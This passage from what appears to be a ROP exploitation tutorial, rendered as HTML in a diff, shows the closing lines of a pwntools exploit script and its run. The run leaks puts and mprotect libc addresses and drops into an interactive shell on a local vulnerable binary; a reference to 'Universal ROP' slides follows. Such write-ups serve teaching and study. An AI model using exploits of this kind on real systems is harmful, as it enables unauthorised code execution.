+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>t<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ./exploit.py
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Starting local process <span style="color:#e6db74">&#39;/path/to/vuln&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> puts@libc: puts_address
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mprotect@libc: mprotect_address
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DONE
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+</span></span><span style="display:flex;"><span>$ echo hi :<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>hi :<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><h2 id="references">References</h2>
 <ul>
 <li><a href="https://www.slideshare.net/inaz2/rop-illmatic-exploring-universal-rop-on-glibc-x8664-en-41595384">Universal ROP</a></li>
 </ul>
